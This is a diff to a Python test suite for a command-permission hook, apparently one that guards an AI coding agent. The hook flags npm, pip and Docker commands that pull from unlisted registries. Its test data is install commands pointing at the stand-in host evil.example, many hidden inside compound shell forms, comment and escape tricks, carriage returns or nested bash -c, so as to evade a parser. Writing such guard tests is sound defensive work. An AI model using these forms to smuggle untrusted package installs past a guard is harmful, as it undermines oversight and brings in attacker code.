@@ -409,16 +409,19 @@ class RegistryTargetTests(unittest.TestCase):
             with self.subTest(command=command):
                 self.assertEqual(targets(command), [(REGISTRY, "evil.example")])
 
-    def test_an_unquoted_command_substitution_in_docker_run_is_unknown(self):
-        # Known limit, pinned so that fixing it is deliberate: destructive._tokens cuts the command at an unquoted `$(`,
-        # so the run has no image and is unknown, which fires the rule. When the splitter reads command substitutions,
-        # these name Docker Hub images (no registry) and should give [] like the quoted form below.
+    def test_an_unquoted_command_substitution_in_docker_run_is_read(self):
+        # Was a known limit, pinned so that fixing it would be deliberate: destructive._tokens cut the command at an
+        # unquoted `$(`, so the run had no image and was unknown. The shared reader (#137) reads command substitutions,
+        # so these name Docker Hub images (no registry) and give [] like the quoted form, as this test said they should;
+        # an image on another registry after the substitution is still read, and so is a registry inside it.
         for command in ("docker run --rm -it -v $(pwd):/app -w /app node:20 npm install",
                         "docker run --rm -u $(id -u):$(id -g) -v \"$PWD\":/w python:3.12 python -V",
                         "podman run --rm -v $(pwd):/w:Z fedora:40 ls"):
             with self.subTest(command=command):
-                self.assertEqual(targets(command), [(UNKNOWN, None)])
+                self.assertEqual(targets(command), [])
         self.assertEqual(targets('docker run --rm -it -v "$(pwd)":/app -w /app node:20 npm install'), [])
+        self.assertEqual(targets("docker run --rm -v $(pwd):/app evil.example/node:20 npm install"), [(REGISTRY, "evil.example/node")])
+        self.assertIn((REGISTRY, "evil.example"), targets("docker run -v $(npm install --registry https://evil.example x):/a node:20"))
 
     def test_runner_options_after_one_the_reader_does_not_know(self):
         url = "https://evil.example/simple"
@@ -661,12 +664,13 @@ class HookDecisionTests(unittest.TestCase):
                         "pip config --timeout 30 set global.index-url https://evil.example/simple",
                         "uvx --no-build-isolation-package foo --index-url https://evil.example/simple ruff",
                         "npm config set -L user registry https://evil.example/",
-                        "docker run --rm -it -v $(pwd):/app -w /app node:20 npm install"):  # the pinned known limit
+                        "docker run --rm -it -v $(pwd):/app -w /app evil.example/node:20 npm install"):
             with self.subTest(command=command):
                 self.assertEqual(self.effect(command, values=values), "deny")
         for command in ("npm install -registry https://registry.npmjs.org/ left-pad",
                         "pip install --pypi-url https://pypi.org/simple x",
-                        'docker run --rm -it -v "$(pwd)":/app -w /app node:20 npm install'):
+                        'docker run --rm -it -v "$(pwd)":/app -w /app node:20 npm install',
+                        "docker run --rm -it -v $(pwd):/app -w /app node:20 npm install"):  # the former known limit
             with self.subTest(command=command):
                 self.assertEqual(self.effect(command, values=values), "none")
 
@@ -826,6 +830,50 @@ class VerifyProbeTests(unittest.TestCase):
             p = policy(values=("npm.example.org",))
             with mock.patch.object(cr, "record_evidence", lambda *a, **k: None):
                 self.assertEqual(cr.decide(bash(command), "claude-code", p)["hookSpecificOutput"]["permissionDecision"], "deny")
+
+
+class CompoundCommandRegistryTests(unittest.TestCase):
+    """#137's compound-command and comment forms reach the registry reader through split_command."""
+
+    def test_registries_inside_compound_commands_and_after_comment_forms(self):
+        evil = (REGISTRY, "evil.example")
+        cases = [
+            "if true; then npm install --registry https://evil.example x; fi",
+            "while true; do npm ci --registry=https://evil.example/; break; done",
+            "until false; do npm install --registry https://evil.example x; done",
+            "{ npm install --registry https://evil.example x; }",
+            "! npm install --registry https://evil.example x",
+            "f() { npm install --registry https://evil.example x; }; f",
+            "function f { npm install --registry https://evil.example x; }",
+            "case a in a) npm install --registry https://evil.example x;; esac",
+            "if true; then NPM_CONFIG_REGISTRY=https://evil.example npm ci; fi",
+            "echo a\\ #; npm install --registry https://evil.example x",  # a `#` after an escaped character is no comment
+            "echo hi\r# ; npm install --registry https://evil.example x",  # nor after a carriage return
+            "ls # note \\\nnpm install --registry https://evil.example x",  # a comment's backslash does not continue it
+            "echo $'\\'' ; npm install --registry https://evil.example x ; echo \\'",
+            "URL=\"$(npm install --registry https://evil.example x)\"",
+            ">/dev/null npm install --registry https://evil.example x",
+        ]
+        for command in cases:
+            with self.subTest(command=command):
+                self.assertIn(evil, targets(command))
+        self.assertIn((REGISTRY, "evil.example/simple"), targets("for p in a; do pip install -i https://evil.example/simple $p; done"))
+        self.assertIn((REGISTRY, "evil.example/acme/app"), targets("! docker push evil.example/acme/app"))
+
+    def test_the_hook_decides_on_them(self):
+        def effect(command, tool="Bash"):
+            event = dict(bash(command), tool_name=tool)
+            result = cr.decide(event, "claude-code", policy())
+            return result.get("hookSpecificOutput", {}).get("permissionDecision", "none")
+
+        with mock.patch.object(cr, "record_evidence", lambda *a, **k: None):
+            self.assertEqual(effect("if true; then npm install --registry https://evil.example x; fi"), "deny")
+            self.assertEqual(effect("echo a\\ #; pip install -i https://evil.example/simple x"), "deny")
+            self.assertEqual(effect("if true; then npm install --registry https://npm.example.org/ x; fi"), "none")
+            # A CR-LF line ending's carriage return is no part of the registry, so a listed one stays listed.
+            self.assertEqual(effect("npm install --registry https://npm.example.org/\r\n"), "none")
+            # A bash script inside a PowerShell command is read with bash's reader, compound commands included.
+            self.assertEqual(effect("bash -c 'if true; then npm install --registry https://evil.example x; fi'", "PowerShell"), "deny")
 
 
 if __name__ == "__main__":
